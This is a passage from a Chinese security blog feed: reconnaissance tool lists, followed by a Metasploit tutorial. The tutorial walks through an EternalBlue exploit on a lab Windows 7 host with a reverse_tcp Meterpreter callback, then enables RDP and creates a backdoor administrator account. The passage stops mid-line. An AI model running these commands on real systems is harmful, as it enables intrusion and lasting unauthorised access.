name="lLpk8"></a></p><h2 id="Ip反查域名"><a href="#Ip反查域名" class="headerlink" title="Ip反查域名"></a>Ip反查域名</h2><p>原理：通过ip反查该ip绑定过的域名<br>ip-adress：<a href="https://www.ip-adress.com/reverse-ip-lookup" target="_blank" rel="noopener">https://www.ip-adress.com/reverse-ip-lookup</a><br>去查网：<a href="http://www.7c.com/" target="_blank" rel="noopener">http://www.7c.com/</a><br>IPIP：<a href="https://tools.ipip.net/ipdomain.php" target="_blank" rel="noopener">https://tools.ipip.net/ipdomain.php</a><br>Dynu：<a href="https://www.dynu.com/zh-CN/NetworkTools/ReverseLookup" target="_blank" rel="noopener">https://www.dynu.com/zh-CN/NetworkTools/ReverseLookup</a><br>yougetsignal：<a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="noopener">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a><br><a name="SIeuA"></a></p><h2 id="查找厂商IP端"><a href="#查找厂商IP端" class="headerlink" title="查找厂商IP端"></a>查找厂商IP端</h2><p><a href="https://ipwhois.cnnic.net/index.jsp" target="_blank" rel="noopener">https://ipwhois.cnnic.net/index.jsp</a><br></p><p><a name="AUsnl"></a></p><h1 id="源码CMS"><a href="#源码CMS" class="headerlink" title="源码CMS"></a>源码CMS</h1><p><a name="qB1Kk"></a></p><h2 id="github监控"><a href="#github监控" class="headerlink" title="github监控"></a>github监控</h2><p><a name="zAILp"></a></p><h3 id="exp监控"><a href="#exp监控" class="headerlink" title="exp监控"></a>exp监控</h3><p>工具地址：<a href="https://github.com/yhy0/github-cve-monitor" target="_blank" rel="noopener">https://github.com/yhy0/github-cve-monitor</a><br></p><p><img src="21.png" alt></p><p>工具地址：<a href="https://github.com/JustYoomoon/CVEAP" target="_blank" rel="noopener">https://github.com/JustYoomoon/CVEAP</a><a name="DOj9B"></a></p><h2 id="引擎搜索"><a href="#引擎搜索" class="headerlink" title="引擎搜索"></a>引擎搜索</h2><p><a name="5Cefm"></a></p><h3 id="白引擎"><a href="#白引擎" class="headerlink" title="白引擎"></a>白引擎</h3><p><img src="22.png" alt></p><h3 id="google-hack语法"><a href="#google-hack语法" class="headerlink" title="google hack语法"></a>google hack语法</h3><p><img src="23.png" alt><br><a name="KdH68"></a></p><h3 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="黑暗引擎"></a>黑暗引擎</h3><p>：：：：：：：：<br></p><p><a name="3u7ax"></a></p><h2 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h2><p><img src="24.png" alt><br><a name="H2X41"></a></p><h3 id="常见的CMS有："><a href="#常见的CMS有：" class="headerlink" title="常见的CMS有："></a>常见的CMS有：</h3><p><img src="25.png" alt><br><a name="EfLFp"></a></p><h3 id="开源CMS在线识别"><a href="#开源CMS在线识别" class="headerlink" title="开源CMS在线识别"></a>开源CMS在线识别</h3><p>国外识别平台：<a href="https://whatcms.org/" target="_blank" rel="noopener">https://whatcms.org/</a><br><br><br>国内识别平台：<br>    bugscaner：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a><br><br><br>    whatweb：<a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a><br>    <br>    云悉：<a href="https://www.yunsee.cn/" target="_blank" rel="noopener">https://www.yunsee.cn/</a><br>    <br>    潮汐：<a href="https://www.yunsee.cn/" target="_blank" rel="noopener">https://www.yunsee.cn/</a><br>    <br>    TSscan:<a href="https://scan.dyboy.cn/web/" target="_blank" rel="noopener">https://scan.dyboy.cn/web/</a><br>    <br>github直接找：<br>    <a href="https://github.com/search?q=cms" target="_blank" rel="noopener">https://github.com/search?q=cms</a>识别<br></p><p><a name="TdgE0"></a></p><h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p><a name="cANPL"></a></p><h4 id="CMSmap"><a href="#CMSmap" class="headerlink" title="CMSmap"></a>CMSmap</h4><p>地址：<a href="https://github.com/dionach/CMSmap" target="_blank" rel="noopener">https://github.com/dionach/CMSmap</a><br><a name="fFbAB"></a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>github克隆下来：<br></p><p><img src="26.png" alt></p><p><a name="OafU9"></a></p><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><p><img src="27.png" alt><br><a name="dxcmH"></a></p><h4 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a>EHole</h4><p>地址：<a href="https://github.com/EdgeSecurityTeam/EHole" target="_blank" rel="noopener">https://github.com/EdgeSecurityTeam/EHole</a><br>安装：哪个系统用下载哪个<br></p><p><img src="29.png" alt></p><p><a name="iHuIv"></a></p><h4 id="CMSeek"><a href="#CMSeek" class="headerlink" title="CMSeek"></a>CMSeek</h4><p>地址：<a href="https://github.com/Tuhinshubhra/CMseek" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMseek</a><br>安装：</p><p><img src="31.png" alt></p><br><p><img src="32.png" alt></p><p><a name="JaIya"></a></p><h4 id="whatcms"><a href="#whatcms" class="headerlink" title="whatcms"></a>whatcms</h4><p>kali自带<br></p><p><img src="33.png" alt></p><p><a name="e6yp9"></a></p><h3 id="chrome插件"><a href="#chrome插件" class="headerlink" title="chrome插件"></a>chrome插件</h3><p><img src="34.png" alt><br><a name="Uw1WP"></a></p><h3 id="人工识别"><a href="#人工识别" class="headerlink" title="人工识别"></a>人工识别</h3><p><img src="35.png" alt><br><a name="PyOfU"></a></p><h4 id="开发语言："><a href="#开发语言：" class="headerlink" title="开发语言："></a>开发语言：</h4><p><img src="36.png" alt><br><a name="iRPVH"></a></p><h4 id="开发框架："><a href="#开发框架：" class="headerlink" title="开发框架："></a>开发框架：</h4><p><img src="37.png" alt><br><a name="t4hku"></a></p><h4 id="第三方组件："><a href="#第三方组件：" class="headerlink" title="第三方组件："></a>第三方组件：</h4><p><img src="38.png" alt><br><a name="4LYMj"></a></p><h4 id="CMS程序："><a href="#CMS程序：" class="headerlink" title="CMS程序："></a>CMS程序：</h4><p><img src="39.png" alt><br><a name="9IQk1"></a></p><h4 id="数据库："><a href="#数据库：" class="headerlink" title="数据库："></a>数据库：</h4><p><img src="40.png" alt><br><a name="A9Tep"></a></p><h2 id="源码泄露安全"><a href="#源码泄露安全" class="headerlink" title="源码泄露安全"></a>源码泄露安全</h2><p><img src="41.png" alt><br><a name="V8Bq6"></a></p><h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h3><p><img src="42.png" alt><br>Githack<br>地址：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a><br>用法：<br></p><p><img src="43.png" alt><br></p><p><img src="44.png" alt><a name="K32iW"></a></p><h3 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h3><p><img src="45.png" alt></p><p>地址：<a href="https://github.com/admintony/svnExploit" target="_blank" rel="noopener">https://github.com/admintony/svnExploit</a><br>安装：<br></p><p><img src="46.png" alt><br>使用：<br></p><p><img src="47.png" alt><br></p><p><img src="%E7%AE%80%E4%BB%8B/65.png" alt="65"></p><p><a name="2fcBD"></a></p><h3 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title="hg源码泄露"></a>hg源码泄露</h3><p><img src="49-1634448553982.png" alt><br>地址：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a> <br>使用：<br></p><p><img src="50-1634448613221.png" alt></p><p><a name="tEamJ"></a></p><h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3><p><img src="51.png" alt><br><a name="qKKIE"></a></p><h3 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h3><p><img src="/52.png" alt></p><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p><img src="53.png" alt></p><p>地址：<a href="https://github.com/foryujian" target="_blank" rel="noopener">https://github.com/foryujian</a><br><a name="mKMIx"></a></p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p><img src="54.png" alt><br><a name="7rzEV"></a></p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title="DS_Store文件泄露"></a>DS_Store文件泄露</h3><p><img src="55.png" alt><br>安装及使用：<br></p><p><img src="56.png" alt></p><p><a name="VSMSA"></a></p><h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p><img src="57.png" alt><br><a name="Kchb4"></a></p><h3 id="github源码泄露"><a href="#github源码泄露" class="headerlink" title="github源码泄露"></a>github源码泄露</h3><p><img src="58.png" alt><br><a name="6ORki"></a></p><h4 id="dumpall"><a href="#dumpall" class="headerlink" title="dumpall"></a>dumpall</h4><p>地址：<a href="https://github.com/0xHJK/dumpall" target="_blank" rel="noopener">https://github.com/0xHJK/dumpall</a><br>安装：<br></p><p><img src="59.png" alt></p><p><br>使用：<br></p><p><img src="60.png" alt></p><br><br><br><br><br><br><br><br><br><br>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a name=&quot;3hIcr&quot;&gt;资产信息收集&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;流程图&quot;&gt;&lt;a href=&quot;#流程图&quot; class=&quot;headerlink&quot; title=&quot;流程图&quot;&gt;&lt;/a&gt;流程图&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;1.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id
      
    
    </summary>
    
      <category term="信息获取" scheme="https://xyzsec.cn/categories/%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/"/>
    
    
      <category term="信息收集" scheme="https://xyzsec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xyzsec.cn/2021/08/08/di-yi-tian-metasploit/"/>
    <id>https://xyzsec.cn/2021/08/08/di-yi-tian-metasploit/</id>
    <published>2021-08-07T16:00:00.000Z</published>
    <updated>2021-10-27T06:46:13.599Z</updated>
    
    <content type="html"><![CDATA[<blockquote></blockquote><p><a name="uav8E"></a></p><h1 id="一：初识Metasploit"><a href="#一：初识Metasploit" class="headerlink" title="一：初识Metasploit"></a>一：初识Metasploit</h1><blockquote><p>“<strong>如果我有八个小时的时间砍树，我会花六个小时磨斧头。</strong>”<br>-亚伯拉罕·林肯</p></blockquote><p><img src="http://tva1.sinaimg.cn/large/007dLEbkly1gvtu4xburfj30b40b4t9f.jpg" alt></p><blockquote><p>Metasploit是The Metasploit Framework的简称,也可以叫做MSF! MSF高度模块化即框架由多个module组成，是全球最受欢迎的工具。<br>Metasploit Framework（MSF）远远不仅仅是一个漏洞的集合。这是您可以建立和利用您的自定义需求的基础架构。这使您可以专注于您独特的环境，而不必重新发明轮子。<br>官网地址：<a href="https://www.metasploit.com/" target="_blank" rel="noopener">https://www.metasploit.com/</a><br>项目地址：<a href="https://github.com/rapid7/metasploit-framework/" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/</a></p></blockquote><p><strong>》》》MSF各个版本对比《《《</strong></p><ul><li>见下文叙述…</li></ul><p><strong>》》》MSF在VPS上安装《《《</strong></p><ul><li>见下文叙述…</li></ul><p><strong>》》》MSF模块框架介绍《《《</strong><br></p><p><img src="http://tva4.sinaimg.cn/large/007dLEbkly1gvtu50x3zjj30ky0cntck.jpg" alt></p><p><a name="fm2Do"></a></p><h3 id="1-1：模块介绍"><a href="#1-1：模块介绍" class="headerlink" title="1.1：模块介绍"></a>1.1：模块介绍</h3><table><thead><tr><th>模块名称</th><th>模块作用</th></tr></thead><tbody><tr><td>Auxiliary</td><td>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</td></tr><tr><td>Exploits</td><td>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</td></tr><tr><td>Payloads</td><td>成功exploit之后，真正在目标系统执行的代码或指令。</td></tr><tr><td>Post</td><td>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作</td></tr><tr><td>Encoders</td><td>对payload进行加密，躲避AntiVirus检查的模块</td></tr><tr><td>Nops</td><td>提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</td></tr></tbody></table><p>注意：MSF默认存放模块目录如下…目录下的6个子文件夹对上面6个模块一一对应….</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a name="A3zLm"></a></p><h3 id="1-2：MSF接口"><a href="#1-2：MSF接口" class="headerlink" title="1.2：MSF接口"></a>1.2：MSF接口</h3><table><thead><tr><th>接口命令</th><th>接口介绍</th></tr></thead><tbody><tr><td>Msfconsole</td><td>命令行控制台用户界面</td></tr><tr><td>Armitage</td><td>基于Msf的可视化高级后渗透工具</td></tr><tr><td>Web View</td><td>MSF网页界面，存在MAC OS中…</td></tr></tbody></table><p><img src="http://tva4.sinaimg.cn/large/007dLEbkly1gvtu52fktvj30fe04rmyw.jpg" alt><br><a name="uJLbb"></a></p><h3 id="1-3：MSF更新"><a href="#1-3：MSF更新" class="headerlink" title="1.3：MSF更新"></a>1.3：MSF更新</h3><pre class="line-numbers language-sql"><code class="language-sql">apt <span class="token keyword">update</span>         <span class="token comment" spellcheck="true">//更新软件源列表</span>apt install metasploit<span class="token operator">-</span>framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a name="e2JEJ"></a></p><h3 id="1-4：MSFDB管理"><a href="#1-4：MSFDB管理" class="headerlink" title="1.4：MSFDB管理"></a>1.4：MSFDB管理</h3><p><strong>》》》基础操作《《《</strong></p><pre class="line-numbers language-sql"><code class="language-sql">msfdb init     <span class="token comment" spellcheck="true"># start and initialize the database   postgresql</span>msfdb reinit   <span class="token comment" spellcheck="true"># delete and reinitialize the database</span>msfdb <span class="token keyword">delete</span>   <span class="token comment" spellcheck="true"># delete database and stop using it</span>msfdb <span class="token keyword">start</span>    <span class="token comment" spellcheck="true"># start the database</span>msfdb stop     <span class="token comment" spellcheck="true"># stop the database</span>msfdb <span class="token keyword">status</span>   <span class="token comment" spellcheck="true"># check service status</span>msfdb run      <span class="token comment" spellcheck="true"># start the database and run msfconsole</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>》》》扩展操作《《《</strong></p><table><thead><tr><th>操作命令</th><th>命令解释</th></tr></thead><tbody><tr><td><strong>db_status</strong></td><td><br>- 查看MSF有没有连接上后台数据库。如果没有连上数据库，在终端输入msfdb start后再启动MSF。没有连接上数据库MSF也是可以使用的，只是连接上了的话，我们渗透过程中获取的一些信息可以保存下来，比如目标机器的账号密码信息等。<br></td></tr><tr><td><strong>db_rebuild_cache</strong></td><td><br>- 这个命令将所有模块信息缓存到数据库中，通过数据库检索效率就高很多了。<br></td></tr><tr><td><strong>db_disconnect</strong></td><td><br>- 断开数据库连接。<br></td></tr><tr><td><strong>db_connect</strong>​</td><td><br>- msf默认连上postgresql的msf数据库。可以用db_connect连接我们指定的数据库。如果要使用配置文件进行连接，默认的数据库配置文件为/usr/share/metasploit-framework/config/database.yml，可以参考这个文件进行编写。<br></td></tr><tr><td><strong>db_nmap</strong></td><td><br>- 集成在msf中的namp扫描命令。不同的是db_nmap扫描的结果会自动保存到数据库中。<br>- 可以输入hosts查看扫描到的主机信息<br>- 如果数据多，可以用 hosts IP 进行过滤；hosts -u 查看up状态的机器；使用  hosts -c 列名[,列名]  指定要看的列；使用 hosts -S 进行搜索，比如hosts -S windows。<br>- 输入services可以查看主机开放的端口情况<br></td></tr><tr><td><strong>creds</strong></td><td><br>- 查看扫描出来的密码信息<br></td></tr><tr><td><strong>vulns</strong></td><td><br>- 查看扫描出来的漏洞信息<br></td></tr><tr><td><strong>loot</strong></td><td><br>- 有些账号密码我们可能没有获取到明文信息，可是经过加密的hash值，可以用这个显示<br></td></tr><tr><td><strong>db_export/db_import</strong></td><td><br>- 数据库的导入和导出<br>- db_export -f /root/msfbak.xml<br>- nmap导出的也可以导入到msf中<br>- nmap -A 192.168.1.113 -oX nmap.xml     =&gt;     db_import -f /root/nmap.xml<br></td></tr></tbody></table><p><a name="AOSwg"></a></p><h3 id="1-5：MSF基础操作"><a href="#1-5：MSF基础操作" class="headerlink" title="1.5：MSF基础操作"></a>1.5：MSF基础操作</h3><blockquote><p>控制台命令支持TAB补全，支持外部命令的执行（系统命令）</p></blockquote><table><thead><tr><th>操作命令</th><th>命令解释</th></tr></thead><tbody><tr><td><strong>help或?</strong></td><td><br>- 显示msfconsole可以使用的命令。help <command>，显示某一命令的用法。<br></td></tr><tr><td><strong>connect</strong></td><td><br>- 可以理解成MSF中的nc命令，可以使用connect -h查看详细用法。<br>- connect [options] <host> <port><br></port></host></td></tr><tr><td><strong>show</strong></td><td><br>- 用show命令查看msf提供的资源。在根目录下执行的话，由于有些模块资源比较多，需要执行show命令要较长的时间<br>- show exploits：查看可以使用的exploit<br>- 除了exploits，还支持all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options。有些选项需要用use使用一个模块后才能使用，比如给show targets。<br></td></tr><tr><td><strong>search</strong></td><td><br>- 搜索模块<br>- 简单搜索：seach ms17_010<br>- 多条件搜索缩小范围：search name:mysql type:exploit platform:linux<br></td></tr><tr><td><strong>info</strong></td><td><br>- 查看模块的信息<br>- info <module name> <br>- 如果用use使用了一个模块，直接输入info即可查看<br></module></td></tr><tr><td><strong>use</strong></td><td><br>- search找到模块后，用use使用模块<br>- use exploit/windows/smb/ms08_067_netapi<br>- 用use使用一个模块后，可以使用 show options查看我们需要配置的选项、使用show targets选择目标主机系统、使用show payloads选择payload、使用show advanced查看高级参数、使用show evasion查看用来做混淆、逃避的模块。<br></td></tr><tr><td><strong>set/setg</strong></td><td><br>- 设置参数，比如要渗透的主机IP、payload等。我们可以用show missing查看没有设置的参数<br>- setg是设置全局变量，避免每个模块都要输入相同的参数<br></td></tr><tr><td><strong>unset/unsetg</strong></td><td><br>- 取消设置参数。unsetg是取消设置的全局变量<br></td></tr><tr><td><strong>save</strong></td><td><br>- 设置的参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。<br></td></tr><tr><td><strong>check</strong></td><td><br>- 检查目标是否真的存在这个漏洞，大部分模块没有check功能<br></td></tr><tr><td><strong>back</strong></td><td><br>- 回到msfconsole根目录<br></td></tr><tr><td><strong>run或exploit</strong></td><td><br>- 开始使用模块<br>- exploit -j：以后台的方式运行<br></td></tr><tr><td><strong>sessions</strong></td><td><br>- 查看当前已经建立的sessions，说明已经拿到了shell<br>- sessions -i id 可以进入一个session交互<br></td></tr><tr><td><strong>load/unload</strong></td><td><br>- 调用外部的扫描命令，比如openvas<br></td></tr><tr><td><strong>loadpath</strong></td><td><br>- 加载自己的模块 <br></td></tr><tr><td><strong>route</strong></td><td><br>- 添加一条路由。比如发往某个子网的流量都通过攻陷的机器发送。<br></td></tr></tbody></table><p><a name="zSkdm"></a></p><h1 id="二：永恒之蓝漏洞"><a href="#二：永恒之蓝漏洞" class="headerlink" title="二：永恒之蓝漏洞"></a>二：永恒之蓝漏洞</h1><blockquote><p>本次测试主要是利用永恒之蓝漏洞对windows7进行控制利用，掌握Metaploit工具的使用，知道永恒之蓝的漏洞利用原理。永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。<br>其中漏洞编号为MS17-010,利用多个SMB远程代码执行漏洞，可在无交互的情况下获取系统最高权限，又为远程代码任意执行！！！</p></blockquote><p><a name="luyTh"></a></p><h3 id="2-1：针对Win7系统"><a href="#2-1：针对Win7系统" class="headerlink" title="2.1：针对Win7系统"></a>2.1：针对Win7系统</h3><p>步骤一：使用<code>msfconsole</code>命令开启MSF，并使用<code>Search</code>命令搜索永恒之蓝漏洞模块…</p><pre class="line-numbers language-sql"><code class="language-sql">Search ms17<span class="token number">-010</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://tva1.sinaimg.cn/large/007dLEbkly1gvtuu2p3kgj30ky068jv7.jpg" alt></p><p><br>步骤二：使用搜索出来的第三个模块来进行探测目标是否存在永恒之蓝漏洞，并设置好以下参数进行扫描测试…</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">use</span>  auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010       <span class="token operator">/</span>模块调用或者使用<span class="token keyword">use</span> <span class="token number">3</span>对搜索出来的模块进行调用<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">set</span>  rhost  <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">202.131</span>                   <span class="token comment" spellcheck="true">//设置目标地址</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">set</span>  rport  <span class="token number">445</span>                               <span class="token comment" spellcheck="true">//设置目标端口</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">show</span> options                                  <span class="token comment" spellcheck="true">//显示要设置的选项</span><span class="token operator">>></span><span class="token operator">></span>run                                           <span class="token comment" spellcheck="true">//开始运行此模块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://tvax4.sinaimg.cn/large/007dLEbkly1gvtuu4tlwpj30tf04yn1o.jpg" alt></p><p>步骤三：通过辅助模块扫描可以发现目标系统存在永恒之蓝漏洞，并开始调用漏洞利用模块按照以下参数来进行攻击…</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">Use</span> exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue      <span class="token comment" spellcheck="true">//调用ms17_010漏洞利用模块</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">Set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp   <span class="token comment" spellcheck="true">//设置payload</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">Set</span> RHOST  受害者IP地址                            <span class="token comment" spellcheck="true">//设置攻击目标的IP地址</span><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">Set</span> LHOST  反弹payload的IP地址                     <span class="token comment" spellcheck="true">//这是反弹的IP地址，即攻击者的IP地址</span><span class="token operator">>></span><span class="token operator">></span>Exploit                                           <span class="token comment" spellcheck="true">//漏洞攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://tva2.sinaimg.cn/large/007dLEbkly1gvtuu6tcraj30ky053q78.jpg" alt></p><p>步骤四：攻击成功后获取一个Meterpreter会话….使用以下命令在Meterpreter会话开启目标主机的3389端口并进入到目标Shell中创建后门账号…</p><pre class="line-numbers language-sql"><code class="language-sql">meterpreter<span class="token operator">></span>run getgui <span class="token operator">-</span><span class="token number">e</span>              <span class="token comment" spellcheck="true">//开启目标机器远程桌面服务器</span>meterpreter<span class="token operator">></span>shell                    <span class="token comment" spellcheck="true">//进入到目标机器的CMD环境当中</span>C:\Windows\system32<span class="token operator">></span>net <span class="token keyword">user</span> warsec 123admiN@ <span class="token operator">/</span><span class="token keyword">add</span>                <span class="token comment" spellcheck="true">//创建后门账号</span>C:\Windows\system32<span class="token operator">></span>net localgroup administrators warsec <span class="token operator">/</span><span class="token keyword">add</span>     <span class="token comment" spellcheck="true">//将后门账号添加到管理员组当中</span><span class="token operator">>></span><span class="token operator">></span>rdesktop <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">0.19</span>                           <span class="token comment" spellcheck="true">//远程桌面到目标机器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://tvax2.sinaimg.cn/large/007dLEbkly1gvtuu8vjy8j30ky09y441.jpg" alt></p><p><img src="http://tva3.sinaimg.cn/large/007dLEbkly1gvtuud586pj30ky0g9wl8.jpg" alt><a name="HqTl1"></a></p><h3 id="2-2：针对Wins8系统"><a href="#2-2：针对Wins8系统" class="headerlink" title="2.2：针对Wins8系统"></a>2.2：针对Wins8系统</h3><ul><li>请见下文详细过程….<br><a name="D2Ply"></a></li></ul><h3 id="2-3：针对Wins03系统"><a href="#2-3：针对Wins03系统" class="headerlink" title="2.3：针对Wins03系统"></a>2.3：针对Wins03系统</h3><ul><li>请见下文详细过程….<br><a name="Y8M6W"></a></li></ul><h3 id="2-4：永恒之蓝漏洞修补"><a href="#2-4：永恒之蓝漏洞修补" class="headerlink" title="2.4：永恒之蓝漏洞修补"></a>2.4：永恒之蓝漏洞修补</h3><ul><li>请见下文详细过程….<br><a name="v0CdO"></a></li></ul><h1 id="三：Meterpreter"><a href="#三：Meterpreter" class="headerlink" title="三：Meterpreter"></a>三：Meterpreter</h1><blockquote><p>Meterpreter通常作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后能够返回给我们一个控制通道。<br>Meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等。 </p></blockquote><p><strong>》》》常规命令《《《</strong></p><ul><li>shell 建立一个被控主机的CMD终端<br><a name="DIEqE"></a></li></ul><h3 id="3-1：核心命令"><a href="#3-1：核心命令" class="headerlink" title="3.1：核心命令"></a>3.1：核心命令</h3><pre class="line-numbers language-sql"><code class="language-sql">background – 将当前会话移动到背景<span class="token keyword">exit</span>、quit – 终止 meterpreter 会话help – 帮助菜单migrate – 移动到一个指定的 PID 的活动进程run – 执行以后它选定的 meterpreter 脚本<span class="token keyword">use</span> – 加载 meterpreter 的扩展<span class="token keyword">load</span>– 加载其他辅助组件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="Cne79"></a></p><h3 id="3-2：文件命令"><a href="#3-2：文件命令" class="headerlink" title="3.2：文件命令"></a>3.2：文件命令</h3><pre class="line-numbers language-sql"><code class="language-sql">cat <span class="token operator">-</span>读取并输出到标准输出文件的内容<span class="token number">cd</span> <span class="token operator">-</span>更改目录对受害人del <span class="token operator">-</span>删除文件对受害人download<span class="token operator">-</span>从受害者系统文件下载edit<span class="token operator">-</span>用 vim编辑文件getlwd <span class="token operator">-</span>打印本地目录getwd <span class="token operator">-</span>打印工作目录lcd <span class="token operator">-</span>更改本地目录lpwd <span class="token operator">-</span>打印本地目录ls <span class="token operator">-</span>列出在当前目录中的文件列表mkdir <span class="token operator">-</span>在受害者系统上的创建目录pwd <span class="token operator">-</span>输出工作目录rm <span class="token operator">-</span>删除文件rmdir <span class="token operator">-</span>受害者系统上删除目录upload<span class="token operator">-</span>从攻击者的系统往受害者系统上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a name="IZ0Dq"></a></p><h3 id="3-3：网络命令"><a href="#3-3：网络命令" class="headerlink" title="3.3：网络命令"></a>3.3：网络命令</h3><pre class="line-numbers language-sql"><code class="language-sql">ipconfig <span class="token operator">-</span>显示网络接口的关键信息，包括 IP 地址、 等。portfwd <span class="token operator">-</span>端口转发portfwd <span class="token keyword">add</span>‐l <span class="token number">33333</span> ‐r <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">5.101</span> ‐p <span class="token number">3389</span>   <span class="token comment" spellcheck="true">#将远程主机的3389端口转发到本地的3333端口</span>route <span class="token operator">-</span>查看或修改受害者路由表<span class="token comment" spellcheck="true">#在全局给指定的session增删路由</span>route <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.0</span>  <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>  <span class="token number">1</span>     <span class="token comment" spellcheck="true">#在session1中添加到达192.168.11.0网段的路由</span>route <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">12.0</span>  <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>  <span class="token number">1</span>     <span class="token comment" spellcheck="true">#在session1中添加到达192.168.12.0网段的路由</span>route <span class="token keyword">add</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span>       <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span>        <span class="token number">1</span>     <span class="token comment" spellcheck="true">#在session1中添加到达0.0.0.0/24网段的路由</span>route del <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">12.0</span>  <span class="token 